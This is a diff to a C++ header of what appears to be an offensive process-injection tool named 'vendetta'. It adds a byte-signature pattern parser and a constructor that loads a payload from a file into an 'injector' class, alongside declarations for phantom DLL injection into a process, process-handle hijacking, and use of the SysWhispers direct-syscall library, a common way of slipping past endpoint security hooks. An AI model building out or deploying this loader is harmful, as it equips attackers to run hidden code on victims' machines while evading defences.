@@ -1,4 +1,5 @@
 #pragma once
+#include <fstream>
 #include <print>
 #include <vector>
 #include <syswhispers.h>
@@ -8,6 +9,37 @@
 
 namespace vendetta
 {
+	struct Pattern
+	{
+		std::string signature;
+		std::string name;
+		std::vector<int> bytes;
+
+		explicit Pattern(const std::string& sig, std::string name = "") : signature(sig),
+			name(std::move(name)), bytes(ParsePattern(sig))
+		{
+		}
+
+		static std::vector<int> ParsePattern(const std::string& pattern)
+		{
+			std::vector<int> result;
+			std::istringstream iss(pattern);
+			std::string token;
+
+			while (iss >> token)
+			{
+				if (token == "?")
+				{
+					result.push_back(-1);
+					continue;
+				}
+				result.push_back(std::stoi(token, nullptr, 16));
+			}
+
+			return result;
+		}
+	};
+
 	bool inject_phantom_dll(const PROCESS_INFORMATION& pi, const BYTE* buf, SIZE_T buf_size, const std::wstring& legitimate_dll_path);
 	HANDLE hijack_process_handle(const DWORD target_pid);
 
@@ -17,12 +49,33 @@ namespace vendetta
 		PROCESS_INFORMATION pi_{};
 		BYTE* buf_;
 		SIZE_T buf_size_;
+		std::vector<BYTE> payload_owner_;
+
+		static std::vector<BYTE> load_payload_from_file(const std::string& file);
 
 	public:
 		template <SIZE_T N>
 		explicit injector(BYTE(&data)[N])
 			: buf_(data), buf_size_(N)
 		{
+		}
+		explicit injector(const std::string& file)
+		{
+			// Load into the class member directly
+			payload_owner_ = load_payload_from_file(file);
+
+			if (payload_owner_.empty())
+			{
+				buf_ = nullptr;
+				buf_size_ = 0;
+				std::println("[-] Failed to load payload from file: {}", file);
+			}
+			else
+			{
+				// Now buf_ points to memory that persists as long as the class exists
+				buf_ = payload_owner_.data();
+				buf_size_ = payload_owner_.size();
+			}
 		}
 
 		~injector();
